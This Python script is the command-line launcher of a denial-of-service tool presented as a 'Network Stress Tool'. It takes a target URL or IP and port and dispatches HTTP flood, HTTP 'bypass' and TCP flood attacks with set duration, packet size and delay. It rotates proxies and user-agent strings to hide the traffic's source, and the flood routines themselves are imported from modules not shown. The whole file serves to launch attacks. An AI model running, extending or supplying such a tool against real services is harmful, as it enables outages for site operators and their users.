import argparse
from banner import sharkprint
from utils.proxy_utils import load_proxies
from workers.http_flood_attack import http_flood_attack
from workers.http_bypass_attack import http_bypass_attack
from workers.tcp_flood_attack import tcp_flood_attack

def load_user_agents(file_path):
    with open(file_path, "r") as file:
        return file.read().splitlines()

def main():
    print(sharkprint)
    parser = argparse.ArgumentParser(description="Network Stress Tool")
    parser.add_argument("target", help="Target URL or IP:Port")
    parser.add_argument("--attack", choices=["http_flood", "http_bypass", "tcp_flood"], required=True, help="Type of attack")
    parser.add_argument("--duration", type=int, default=60, help="Duration of attack in seconds")
    parser.add_argument("--packet-size", type=int, default=64, help="Packet size in KB (default: 64)")
    parser.add_argument("--packet-delay", type=int, default=100, help="Delay between packets in milliseconds (default: 100)")
    args = parser.parse_args()

    proxies = load_proxies("data/proxies.txt")
    user_agents = load_user_agents("data/uas.txt")

    if args.attack == "http_flood":
        http_flood_attack(args.target, proxies, user_agents, args.duration, args.packet_size, args.packet_delay)
    elif args.attack == "http_bypass":
        http_bypass_attack(args.target, proxies, user_agents, args.duration, args.packet_size, args.packet_delay)
    elif args.attack == "tcp_flood":
        tcp_flood_attack(args.target, proxies, args.duration, args.packet_size, args.packet_delay)

if __name__ == "__main__":
    main()
